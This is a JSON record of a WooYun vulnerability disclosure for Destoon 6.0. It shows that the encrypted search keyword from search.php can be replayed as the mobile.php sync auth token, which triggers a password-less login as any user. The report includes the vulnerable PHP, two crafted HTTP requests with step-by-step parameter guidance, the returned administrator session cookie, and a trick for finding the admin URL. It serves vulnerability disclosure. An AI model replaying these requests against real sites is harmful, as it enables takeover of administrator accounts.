{"id": 73382, "wybug_id": "wooyun-2015-0150593", "wybug_title": "Destoon 加密解密函数引发的伪造登录漏洞", "wybug_corp": "DESTOON", "wybug_author": "xiao.k", "wybug_date": "2015-10-30 17:36", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "非授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "越权操作", "认证缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-03：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 更换加密解密函数依旧不能解决此类问题 XD 详细说明：  此问题的产生是由于Destoon对加密解密函数过分的依赖和使用。首先来看加密函数`mobile\\search.php`\n<?php\trequire 'common.inc.php';\t$club_post = (substr($action, 0, 4) == 'post' && isset($MODULE[18])) ? 1 : 0;\tif(isset($_POST['ok']) && isset($wd) && $wd) {\t\tif(in_array($action, array('message'))) {\t\t\t$url = $action.'.php?';\t\t} else if($club_post) {\t\t\t$catid = intval(substr($action, 4));\t\t\t$url = 'index.php?moduleid=18&catid='.$catid.'&';\t\t} else {\t\t\t$moduleid = intval(str_replace('mod', '', $action));\t\t\t$url = 'index.php?moduleid='.$moduleid.'&';\t\t}\t\t$wd = input_trim($wd);\t\t$wd = convert($wd, 'UTF-8', DT_CHARSET);\t\tdheader($url.'kw='.encrypt($wd));\t}\t$head_title = $L['search_title'].$DT['seo_delimiter'].$head_title;\t$foot = 'channel';\tinclude template('search', 'mobile');\tif(DT_CHARSET != 'UTF-8') toutf8();\t?>\n当我们提交wd明文时，程序会将内容进行加密，并且在header里提示出来。例如：\nHTTP/1.1 302 Found\tDate: Fri, 30 Oct 2015 03:06:05 GMT\tServer: Apache/2.4.12\tX-Powered-By: PHP/5.6.6\tlocation: index.php?moduleid=16&kw=1d81E9mw4aiA5dXHvhHh-S-7pzTBTdgq9DDoVGjw-P-P3CT5EW7k6ToojgtYFPI2PCmEIbo1P3BHjCWDwaGD\tVary: User-Agent\tContent-Length: 0\tContent-Type: text/html;charset=UTF-8\n这里的`1d81E9mw4aiA5......CWDwaGD`就是wd明文加密后的内容。我们再看另外一个位置。`mobile\\mobile.php`,14行\nif(strpos($DT_URL, 'action=sync&auth=') !== false && strpos($DT_URL, 'goto=') !== false) {\t\tif($DT_MOB['os'] == 'ios'||1) {\t\t\tisset($auth) or $auth = '';\t\t\t$auth = decrypt($auth);\t\t\tif($auth) {\t\t\t\t$arr = explode('|', $auth);\t\t\t\tif(check_name($arr[0]) && $_username != $arr[0] && $DT_IP == $arr[1] && $DT_TIME - $arr[2] < 600) {\t\t\t\t\tinclude load('member.lang');\t\t\t\t\t$MOD = cache_read('module-2.php');\t\t\t\t\tinclude DT_ROOT.'/module/member/member.class.php';\t\t\t\t\t$do = new member;\t\t\t\t\t$user = $do->login($arr[0], '', 0, true);\t\t\t\t}\t\t\t}\t\t\t$tmp = explode('goto=', $DT_URL);\t\t\t$goto = $tmp[1];\t\t\tif(preg_match(\"/^[a-z0-9_\\.\\?\\&\\=\\-]{5,}$/\", $goto)) {\t\t\t\tif(strpos($goto, '://') === false) $goto = $MODULE[2]['linkurl'].$goto;\t\t\t\t$url = $goto;\t\t\t}\t\t}\t\tdheader($url);\t}\n程序经过简单的条件判断以后，进入 `$auth = decrypt($auth);`。然后对auth进行解密和解析。最终传入 `$do->login($arr[0], '', 0, true);`。我们来看一下login的代码：\nfunction login($login_username, $login_password, $login_cookietime = 0, $admin = false) {\t\tglobal $DT_TIME, $DT_IP, $MOD, $MODULE, $L;\t\tif(!check_name($login_username)) return $this->_($L['member_login_username_bad']);\t\tif(!$MOD || !isset($MOD['login_times'])) $MOD = cache_read('module-2.php');\t\t$login_lock = ($MOD['login_times'] && $MOD['lock_hour']) ? true : false;\t\t$LOCK = array();\t\tif($login_lock) {\t\t\t$LOCK = cache_read($DT_IP.'.php', 'ban');\t\t\tif($LOCK) {\t\t\t\tif($DT_TIME - $LOCK['time'] < $MOD['lock_hour']*3600) {\t\t\t\t\tif($LOCK['times'] >= $MOD['login_times']) return $this->_(lang($L['member_login_ban'], array($MOD['login_times'], $MOD['lock_hour'])));\t\t\t\t} else {\t\t\t\t\t$LOCK = array();\t\t\t\t\tcache_delete($DT_IP.'.php', 'ban');\t\t\t\t}\t\t\t}\t\t}\t\t$user = userinfo($login_username, 0);\t\tif(!$user) {\t\t\t$this->lock($login_lock, $LOCK, $DT_IP, $DT_TIME);\t\t\treturn $this->_($L['member_login_not_member']);\t\t}\t\tif(!$admin) {\t\t\tif($user['password'] != dpassword($login_password, $user['passsalt'])) {\t\t\t\t$this->lock($login_lock, $LOCK, $DT_IP, $DT_TIME);\t\t\t\treturn $this->_($L['member_login_password_bad']);\t\t\t}\t\t}\t\tif($user['groupid'] == 2) return $this->_($L['member_login_member_ban']);\t\t$userid = $user['userid'];\t\tif(isset($MODULE[16])) $this->cart($userid);\t\tif($MOD['credit_login'] > 0 && timetodate($DT_TIME, 3) != timetodate($user['logintime'], 3)) {\t\t\tcredit_add($login_username, $MOD['credit_login']);\t\t\tcredit_record($login_username, $MOD['credit_login'], 'system', $L['member_record_login'], $DT_IP);\t\t}\t\t$cookietime = $DT_TIME + ($login_cookietime ? intval($login_cookietime) : 86400*7);\t\t$auth = encrypt($user['userid'].'|'.$user['password']);\t\tset_cookie('auth', $auth, $cookietime);\t\tset_cookie('username', $user['username'], $DT_TIME + 30*86400);\t\t$this->db->query(\"UPDATE {$this->table_member} SET loginip='$DT_IP',logintime=$DT_TIME,logintimes=logintimes+1 WHERE userid=$userid\");\t\treturn $user;\t}\n当 admin 为true时，实际上不检查用户的密码。所以我们传入用户名就可以登陆了。接下来的思路就是：我们使用search.php里的wd，构造加密语句。然后将加密后的字符串传入mobile.php里的auth，最终返回目标用户的cookies凭据。   漏洞证明：  ## 漏洞利用代码首先要注册一个正常的用户（我这注册的是test），然后修改cookies，并修改数据包如下\nPOST /official/Destoon_6.0_UTF8/destoon/mobile/search.php HTTP/1.1\tHost: 127.0.0.1\tProxy-Connection: keep-alive\tContent-Length: 49\tCache-Control: max-age=0\tAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\tOrigin: http://127.0.0.1\tUpgrade-Insecure-Requests: 1\tUser-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\tContent-Type: application/x-www-form-urlencoded\tDNT: 1\tReferer: http://127.0.0.1/official/Destoon_6.0_UTF8/destoon/mobile/search.php\tAccept-Encoding: gzip, deflate\tAccept-Language: zh-CN,zh;q=0.8,en;q=0.6\tCookie: PHPSESSID=pncgroob61h293o1oietfpeh27; cz4_auth=85faIYElgPwGy6R16VvtsS6-P-O38WI7Clf-P-2HuKeXeyP3tCf3LhpytRKBtJefqbDTo66yap-S-FwyEuUAz86DRATM7d; cz4_username=test; cz4_mobile=screen\t\tok=1&action=mod16&wd=destoon|127.0.0.1|1446174241\n要注意修改以下几个位置\nPHPSESSID //根据自身登录的账户情况进行修改。\tcz4_auth //根据自身登录的账户情况进行修改。\tcz4_username //根据自身登录的账户情况进行修改。\tcz4_mobile //这里要设置为screen\twd // 以分隔符为界限，第一部分为目标用户的用户名。我这里设置的是管理员destoon。第二部分是自身的ip、可以通过ip138进行找到。第三部分1446174241是当前时间的unixtime。\n构造好以后返回一个302转向\nHTTP/1.1 302 Found\tDate: Fri, 30 Oct 2015 03:06:05 GMT\tServer: Apache/2.4.12\tX-Powered-By: PHP/5.6.6\tlocation: index.php?moduleid=16&kw=1d81E9mw4aiA5dXHvhHh-S-7pzTBTdgq9DDoVGjw-P-P3CT5EW7k6ToojgtYFPI2PCmEIbo1P3BHjCWDwaGD\tVary: User-Agent\tContent-Length: 0\tContent-Type: text/html;charset=UTF-8\n这里的kw为之前wd的加密后数据。接下来发第二个数据包：\nGET /official/Destoon_6.0_UTF8/destoon/mobile/mobile.php?action=sync&auth=1d81E9mw4aiA5dXHvhHh-S-7pzTBTdgq9DDoVGjw-P-P3CT5EW7k6ToojgtYFPI2PCmEIbo1P3BHjCWDwaGD&goto=123 HTTP/1.1\tHost: 127.0.0.1\tProxy-Connection: keep-alive\tCache-Control: max-age=0\tAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\tUpgrade-Insecure-Requests: 1\tUser-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5\tDNT: 1\tAccept-Encoding: gzip, deflate, sdch\tAccept-Language: zh-CN,zh;q=0.8,en;q=0.6\tCookie: PHPSESSID=pncgroob61h293o1oietfpeh27; cz4_mobile=screen; cz4_forward_url=http%3A%2F%2F127.0.0.1%2Fofficial%2FDestoon_6.0_UTF8%2Fdestoon%2F; cz4_auth=cdc9-S-BF3fVOmLsYXOJQWJut3TLPefPEqh3hOAeUiF9xFLTs5RTGTp4bWZHg9I-S-MThgfvPeJqo4-S-D6ITxzVSny-S-fi; cz4_username=test\nCookies部分注意替换成你自己的。`cz4_mobile=screen;`这部分不要忘记了。然后auth的值就是上方kw的值。接下来系统将会再次返回一个302.这里sec-cookies为目标用户的cookies值。拿着这些凭据即可登录后台。\nHTTP/1.1 302 Found\tDate: Fri, 30 Oct 2015 03:12:34 GMT\tServer: Apache/2.4.12\tX-Powered-By: PHP/5.6.6\tSet-Cookie: cz4_auth=48c4oIk6J4YJ-P-0rMcCaKnZvs1lHN8XfSN0c3CT7MEjorb2Njv41pPyV0ElAdmPQoWQWcbGhhdNHHvt-P-isqgV7dYG; expires=Fri, 06-Nov-2015 03:12:34 GMT; Max-Age=604800; path=/\tSet-Cookie: cz4_username=destoon; expires=Sun, 29-Nov-2015 03:12:34 GMT; Max-Age=2592000; path=/\tlocation: http://127.0.0.1/official/Destoon_6.0_UTF8/destoon/mobile/\tVary: User-Agent\tContent-Length: 44\tContent-Type: text/html;charset=UTF-8\n在此补充一下如何拿到后台的地址。我们可以利用给管理人员发信息，通过http referer进行获取。例如我们可以在前台申请广告。\n\n当管理人员审核申请时，可以获取到http referer。 \n\n   修复方案：  在设计系统的时候，加密解密函数应该谨慎使用。   版权声明：转载请注明来源 xiao.k@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-10-31 23:07 厂商回复： 感谢反馈 我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-12-17 15:28 |    \t\tManning \t\t\t( 普通白帽子  |\t\t\t        Rank:844 漏洞数:110        | https://github.com/manning23/MSpider)\t\t \n  厂商最新版修复也是醉了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}